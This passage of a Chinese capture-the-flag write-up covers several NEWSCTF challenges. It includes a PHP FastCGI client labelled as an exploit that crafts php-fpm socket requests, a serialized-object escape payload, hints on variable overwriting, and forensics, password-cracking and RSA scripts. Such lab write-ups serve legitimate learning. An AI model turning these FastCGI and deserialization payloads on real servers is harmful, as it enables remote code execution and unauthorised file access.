<span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(base64_encode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;120.78.22.12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;120.78.22.12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接打就好了。</p>
<p>打 tcp 模式或者 unix套接字模式都可以。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622519136613-6be90ae6-1636-4f8c-8e52-21b744b2ddc0.png" alt="image.png"></p>
<p>至于前面那个hint , 可以 url 编码绕，挺奇怪的，我也是抱着试一下心理，用url编码绕，结果就出phpinfo() 了，很奇怪。</p>
<p>还有注意的点就是，不要url编码后再base64 ，我就卡在这一步一直出不来，直接将fpm流base64 编码，本来想打rce的，没成功，可能是出题人设置的吧。</p>
<h3 id="weblogin"><a href="#weblogin" class="headerlink" title="weblogin"></a>weblogin</h3><p>在本地搭了试了一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$datafile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;datafile = <span class="string">&#x27;flag4292787810c14bed46572020d61a77ed&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;act = <span class="string">&#x27;register&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&quot;;&quot;</span>.serialize(<span class="keyword">new</span> Action).<span class="string">&#x27;&#125;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="string">&#x27;O:6:&quot;Action&quot;:5:&#123;s:4:&quot;data&quot;;a:1:&#123;s:17:&quot;jiang0123&quot;;s:253:&quot;;O:6:&quot;Action&quot;:5:&#123;s:4:&quot;data&quot;;s:0:&quot;&quot;;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:40:&quot;flag4292787810c14bed46572020d61a77ed/123&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;&#125;&#125;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;&#125;&quot;;&#125;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;&#125;&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>把序列化后的东西可见字符编码再写入data文件，编码那里出了问题，可能造成逃逸。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622519494037-0c0dac3c-8d1b-497d-85cf-1a12eeb9a24e.png" alt="image.png"></p>
<p>如果是 =xx 就不加密了，挺无聊的。</p>
<h3 id="shorturl"><a href="#shorturl" class="headerlink" title="shorturl"></a>shorturl</h3><p>感觉应该是非预期了</p>
<p>可以任意文件写入的，如果可以admin 删除 url  <em>request</em> 然后让这些文件数量不大于1 就行。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622621954706-67a00236-bb84-42e4-a652-9c671928f939.png" alt="image.png"></p>
<p>变量覆盖导致我们可以越权成为 admin  删除文件。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622621991796-1524ee31-8614-4bfd-8355-004b83dbbfe9.png" alt="image.png"></p>
<p>这里存在反序列化漏洞，而且我们可以注入 |  来打破分隔。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622622073040-f38cb449-3c3a-40bb-9ac8-978c25b5836c.png" alt="image.png"></p>
<p>在文件删除的地方可以调用，写入的时候也有调用</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622621837382-af943cbe-11de-4d44-9886-3a48b2436d35.png" alt="image.png"></p>
<p>发一发包就好了。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="2021-6-1萌新赛-very-ez-dump"><a href="#2021-6-1萌新赛-very-ez-dump" class="headerlink" title="2021.6.1萌新赛-very-ez-dump"></a>2021.6.1萌新赛-very-ez-dump</h3><p>扔进取证大师  拿到加密压缩包，hint提示需要找user密码。</p>
<p>用volatility hashdump发现是空密码。</p>
<p>无语子。</p>
<p>pslist发现有cmd进程</p>
<p>volatility -f ??? –profile = ???   consoles</p>
<p>找到了密码。</p>
<p>解压拿到flag。</p>
<h3 id="2021-6-1萌新赛-sign-in"><a href="#2021-6-1萌新赛-sign-in" class="headerlink" title="2021.6.1萌新赛-sign in"></a>2021.6.1萌新赛-sign in</h3><p>pdf加密了。</p>
<p>先用pdf2john.pl 拿到hash值然后用hashcat爆破就好了，一秒出。</p>
<h3 id="流量题。"><a href="#流量题。" class="headerlink" title="流量题。"></a>流量题。</h3><p>zip文件，打开后流量题。</p>
<p>搜索字符串galf找到对应的流后，提取hex编码并进行取反，脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">txt=&quot;????&quot;</span><br><span class="line"></span><br><span class="line">length = len(txt)</span><br><span class="line">for i in range(len(txt),0,-2):</span><br><span class="line">    # print(txt[length-i:length-i-2])</span><br><span class="line">    print(txt[i-2:i],end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>保存到1.rar文件，有密码和hint。</p>
<p>然后用流量包的密码来解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r flag1.pcapng  -T fields -e urlencoded-form.value | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210601165144525.png" alt="image-20210601165144525"></p>
<p>用密码一个一个试就出了。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTQ1NjcwNTg1MjMwNGU2MTRkN2E0ZTUwNTQ2YzU2NTg1NDdhNGU1NDRlMzAzNTQ3NTc0NTU5MzI0ZTQ2NTI0YjU0NTQ1NjU2NTM0NTZiMzM1MzU0MzAzZA%3D%3D</span><br></pre></td></tr></table></figure>

<p>后面多了两个url编码的东西，去掉拿去自动解密，套了几个base而已</p>
<h3 id="字符串与字节（未做出抄官方WP的）"><a href="#字符串与字节（未做出抄官方WP的）" class="headerlink" title="字符串与字节（未做出抄官方WP的）"></a>字符串与字节（未做出抄官方WP的）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">010101100100010101110101010001010100010001000101010101100100011001010110011001000100010001000110011001100110010001100100010101100100010001010101010101010101010101000110</span><br><span class="line"> <span class="number">101010101001101111011001101101011011011101000100100100110110010010010101001101101010011101000011010101010101010000110111100001000101101010000110101010011000101001001111</span></span><br></pre></td></tr></table></figure>

<p>第一段可以直接转字节，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VEuEDEVFVdDFfddVDUUUF</span><br></pre></td></tr></table></figure>

<p>费解</p>
<p>看了官方的WP，这也太费解了吧，奇数偶数位</p>
<img alt="20210601 NEWSCTF（萌新赛）-2c9d444a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-2c9d444a.png" width="" height="" >

<h3 id="rsa256"><a href="#rsa256" class="headerlink" title="rsa256"></a>rsa256</h3><p>这个文件的日期我很好奇</p>
<img alt="20210601 NEWSCTF（萌新赛）-3acfd61c.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-3acfd61c.png" width="" height="" >

<p>基础的二进制文件读取和rsa公钥提取，主要考验rsa库函数的一些运用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3b6d3806-4b2b-11e7-95a0-000c29d7e93d&#125;</span><br></pre></td></tr></table></figure>

<p>贴一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">n = <span class="number">98432079271513130981267919056149161631892822707167177858831841699521774310891</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">302825536744096741518546212761194311477</span></span><br><span class="line">p = <span class="number">325045504186436346209877301320131277983</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(invert(e, phi))</span><br><span class="line"></span><br><span class="line">pri_key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/RSA256/encrypted.message1&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(fp.read(), pri_key).decode())</span><br><span 